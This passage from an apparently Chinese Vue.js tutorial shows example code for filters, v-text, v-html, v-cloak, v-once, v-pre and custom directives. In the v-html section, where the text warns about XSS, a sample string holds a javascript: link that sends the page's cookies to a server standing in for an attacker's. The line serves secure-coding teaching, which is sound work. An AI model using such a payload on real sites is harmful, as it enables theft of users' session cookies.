class="tag">&lt;<span class="name">h2</span>&gt;</span>格式化后的时间：<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 计算属性实现 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在的时间：&#123;&#123;showTime&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- methods实现 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在的时间：&#123;&#123;showTime01()&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 过滤器实现 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在的时间：&#123;&#123;time | showTime02&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 过滤器实现(传参) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在的时间：&#123;&#123;time | showTime02(&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;)&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 过滤器实现(多个过滤器串联) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在的时间：&#123;&#123;time | showTime02(&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;) | mySlice&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 过滤器实现(多个过滤器串联) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span> <span class="attr">:x</span>=<span class="string">&quot;msg | mySlice&quot;</span>&gt;</span>电信学院<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//全局过滤器</span></span></span><br><span class="line"><span class="javascript">    Vue.filter(<span class="string">&#x27;mySlice&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">val</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> val.slice(<span class="number">0</span>,<span class="number">4</span>)</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            time:1629796662740,</span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好电信学院&#x27;</span></span></span><br><span class="line">        &#125;, </span><br><span class="line">        computed:&#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showTime</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> dayjs(<span class="built_in">this</span>.time).format(<span class="string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showTime01</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> dayjs(<span class="built_in">this</span>.time).format(<span class="string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,    </span><br><span class="line">        filters:&#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showTime02</span>(<span class="params">val,str=<span class="string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;@&#x27;</span>,val)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> dayjs(val).format(str)</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="comment">//局部过滤器</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// mySlice(val)&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     return val.slice(0,4)</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// &#125;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="33-内置指令-v-text"><a href="#33-内置指令-v-text" class="headerlink" title="33.内置指令(v-text)"></a>33.内置指令(v-text)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>内置指令(v-text)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        已经学过的指令：</span></span><br><span class="line"><span class="comment">            v-bind:单向数据绑定解析表达式，可简写为“:xxx”</span></span><br><span class="line"><span class="comment">            v-model:双向数据绑定</span></span><br><span class="line"><span class="comment">            v-on:绑定事件监听，可简写为“@xx”</span></span><br><span class="line"><span class="comment">            v-for:遍历数组、对象、字符串</span></span><br><span class="line"><span class="comment">            v-if:条件渲染（动态控制节点是否存在）</span></span><br><span class="line"><span class="comment">            v-else-if:条件渲染（动态控制节点是否存在）</span></span><br><span class="line"><span class="comment">            v-else:条件渲染（动态控制节点是否存在）</span></span><br><span class="line"><span class="comment">            v-show:条件渲染（动态控制节点是否展示）</span></span><br><span class="line"><span class="comment">        v-text指令：</span></span><br><span class="line"><span class="comment">            1.作用：向其所在的节点渲染文本内容。</span></span><br><span class="line"><span class="comment">            2.与插值语法的区别：v-text会替换掉节点中的内容，&#123;&#123;xxx&#125;&#125;则不会。</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-text</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-text</span>=<span class="string">&quot;str&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            name:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line"><span class="handlebars"><span class="xml">            str:&#x27;<span class="tag">&lt;<span class="name">h3</span>&gt;</span>你好啊！<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="34-内置指令-v-html"><a href="#34-内置指令-v-html" class="headerlink" title="34.内置指令(v-html)"></a>34.内置指令(v-html)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>内置指令(v-html)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        v-html指令：</span></span><br><span class="line"><span class="comment">            1.作用：向其所在的节点渲染包含HTML结构的内容。</span></span><br><span class="line"><span class="comment">            2.与插值语法的区别：</span></span><br><span class="line"><span class="comment">                (1).v-html会替换掉节点中所有的内容，&#123;&#123;xxx&#125;&#125;则不会。</span></span><br><span class="line"><span class="comment">                (2).v-html可以识别HTML结构。</span></span><br><span class="line"><span class="comment">            3.严重注意，HTML有安全性问题：</span></span><br><span class="line"><span class="comment">                (1).在网站上动态渲染任意HTML是非常危险的，容易导致xss攻击。</span></span><br><span class="line"><span class="comment">                (2).一定要在可信的内容上使用v-html，永远不要再用户提交的内容上。</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="handlebars"><span class="xml">            str:&#x27;<span class="tag">&lt;<span class="name">h3</span>&gt;</span>你好啊！<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>&#x27;,</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//危险代码片段，获取网页cookie并发送到百度网站（百度网站模拟坏人的服务器）</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            str2:&#x27;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:location.href</span>=<span class="string">&quot;http://www.baidu.com?&quot;</span>+<span class="attr">document.cookie</span>&gt;</span>你好啊！<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="35-内置指令-v-cloak"><a href="#35-内置指令-v-cloak" class="headerlink" title="35.内置指令(v-cloak)"></a>35.内置指令(v-cloak)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>内置指令(v-cloak)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-attr">[v-cloak]</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: none;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        v-cloak指令(没有值)：</span></span><br><span class="line"><span class="comment">            1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。</span></span><br><span class="line"><span class="comment">            2.使用CSS配合v-cloak可以解决网速慢时页面展示出&#123;&#123;xxx&#125;&#125;的问题。</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-cloak</span>&gt;</span>&#123;&#123;str&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            str:<span class="string">&#x27;你好啊！&#x27;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="36-内置指令-v-once"><a href="#36-内置指令-v-once" class="headerlink" title="36.内置指令(v-once)"></a>36.内置指令(v-once)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>内置指令(v-once)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        v-once指令：</span></span><br><span class="line"><span class="comment">            1.v-once所在节点在初次动态渲染后，就视为静态内容了。</span></span><br><span class="line"><span class="comment">            2.以后数据改变不会引起v-once所在结构的数据更新，可以用于优化性能。</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-once</span>&gt;</span>初始化的n值是：&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            n:5,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="37-内置指令-v-pre"><a href="#37-内置指令-v-pre" class="headerlink" title="37.内置指令(v-pre)"></a>37.内置指令(v-pre)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>内置指令(v-pre)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        v-pre指令：</span></span><br><span class="line"><span class="comment">            1. v-pre可以跳过其所在节点的编译过程。</span></span><br><span class="line"><span class="comment">            2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-pre</span>&gt;</span>Vue其实很简单<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            n:5,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="38-自定义指令"><a href="#38-自定义指令" class="headerlink" title="38.自定义指令"></a>38.自定义指令</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>自定义指令<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        1.需求1：定义一个v-big指令，与v-text指令类似，但会把绑定的数值放大10倍。</span></span><br><span class="line"><span class="comment">        2.需求2：定义一个v-fbind指令，与v-bind指令类似，但可以让其所绑定的input元素默认获取焦点。</span></span><br><span class="line"><span class="comment">        自定义指令总结：</span></span><br><span class="line"><span class="comment">            一、定义语法：</span></span><br><span class="line"><span class="comment">                1.局部指令：</span></span><br><span class="line"><span class="comment">                    new Vue(&#123;                                       new Vue(&#123;</span></span><br><span class="line"><span class="comment">                        directives:&#123;指令名:配置对象&#125;     或              directives()&#123;&#125;</span></span><br><span class="line"><span class="comment">                    &#125;)                                              &#125;)</span></span><br><span class="line"><span class="comment">                2.全局指令：</span></span><br><span class="line"><span class="comment">                    Vue.directive(&#x27;指令名&#x27;,配置对象)     或          Vue.directive(&#x27;指令名&#x27;,回调函数) </span></span><br><span class="line"><span class="comment">            二、配置对象中常用的三个回调：</span></span><br><span class="line"><span class="comment">                1.bind(element,binding)：指令与元素成功绑定时被调用</span></span><br><span class="line"><span class="comment">                2.inserted(element,binding)：指令所在元素被插入页面时被调用</span></span><br><span class="line"><span class="comment">                3.update(element,binding)：指令所在的模板被重新解析时被调用</span></span><br><span class="line"><span class="comment">            三、备注：</span></span><br><span class="line"><span class="comment">                1.指令定义时不加v-，但使用时要加v-前缀；</span></span><br><span class="line"><span class="comment">                2.指令名如果是多个单词时，要使用kebab-case命名方式，不要使用camelCase命名；</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-text</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;h2&gt;放大10倍的n值是：&lt;span v-big-number=&quot;n&quot;&gt;&lt;/span&gt;&lt;/h2&gt; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>放大10倍的n值是：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-big</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">   